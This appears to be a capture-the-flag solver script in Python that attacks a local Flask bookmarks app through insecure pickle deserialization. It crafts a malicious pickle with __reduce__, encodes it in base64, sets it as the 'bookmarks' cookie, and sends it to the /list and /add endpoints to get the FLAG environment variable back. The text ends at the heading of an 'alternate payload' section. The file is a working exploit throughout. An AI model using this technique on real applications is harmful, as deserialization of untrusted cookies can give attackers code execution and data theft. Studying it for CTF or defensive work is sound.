import requests
import pickle
import base64
import os

print("=" * 70)
print("Testing pickle deserialization exploit against Flask application")
print("=" * 70)

target_url = "http://127.0.0.1:32962"

# Create the exploit payload
class FlagExploit:
    def __reduce__(self):
        # Returns a list containing a dict with FLAG
        return (list, ([{"name": "FLAG", "url": os.getenv("FLAG", "NOT_FOUND")}],))

# Generate base64 payload
payload = pickle.dumps(FlagExploit(), protocol=4)
payload_b64 = base64.b64encode(payload).decode()

print(f"\n[+] Generated payload: {payload_b64}")

# Set up cookies with our malicious payload
cookies = {
    'bookmarks': payload_b64,
    'user': '70929e2b49544df886020e602d4090c9'
}

# Test on /list endpoint
print(f"\n[+] Sending request to {target_url}/list")
try:
    response = requests.get(f"{target_url}/list", cookies=cookies, timeout=10)
    print(f"[+] Status: {response.status_code}")
    print(f"[+] Response:\n{response.text}")
    
    # Check if FLAG appears in response
    if 'FLAG' in response.text or 'flag' in response.text.lower():
        print("\n[!] FLAG FOUND IN RESPONSE!")
except Exception as e:
    print(f"[-] Error: {e}")

# Test on /add endpoint
print(f"\n[+] Testing /add endpoint")
try:
    response = requests.get(f"{target_url}/add", cookies=cookies, timeout=10)
    print(f"[+] Status: {response.status_code}")
    print(f"[+] Response:\n{response.text}")
    
    if 'FLAG' in response.text or 'flag' in response.text.lower():
        print("\n[!] FLAG FOUND IN RESPONSE!")
except Exception as e:
    print(f"[-] Error: {e}")

# Test the alternate payload (formatted string)
print("\n" + "=" * 70)
print("Testing alternate payload (formatted FLAG string)")
print("=" * 70)

